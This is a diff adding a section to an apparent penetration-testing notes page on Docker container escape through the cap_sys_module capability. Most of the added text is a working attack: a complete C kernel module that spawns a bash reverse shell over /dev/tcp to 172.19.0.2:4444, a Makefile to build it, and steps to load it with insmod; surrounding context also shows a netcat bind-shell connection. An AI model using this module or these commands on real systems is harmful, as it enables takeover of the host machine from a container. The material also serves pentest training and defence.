@@ -87,3 +87,56 @@ then connect host machine with bind shell
 
 `nc IP PORT`
 
+
+
+## cap\_sys\_module capability
+
+If there is cap\_sys\_module capability inside the docker container, then that breakout can work . This capability allows the process to load kernel modules and manipulate the kernel, which can be exploited to compromise the underlying host system's security.
+
+```
+capsh --print
+# if you see cap_sys_module 
+```
+
+Then check for the IP address of the docker. First of A.B.C.01 is for the host machine itself.
+
+```c
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Test");
+MODULE_DESCRIPTION("Reverse shell module");
+MODULE_VERSION("1.0");
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/172.19.0.2/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+static int __init reverse_shell_init(void) {
+return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+static void __exit reverse_shell_exit(void) {
+printk(KERN_INFO "Exiting\n");
+}
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+```
+
+Then we should create a Makefile to compile kernel module.&#x20;
+
+```
+obj-m +=reverse-shell.o
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+```
+
+Make the kernel module.
+
+`make`
+
+Listen on the port in docker container
+
+Then in new terminal&#x20;
+
+`insmod reverse-shell.ko`
+
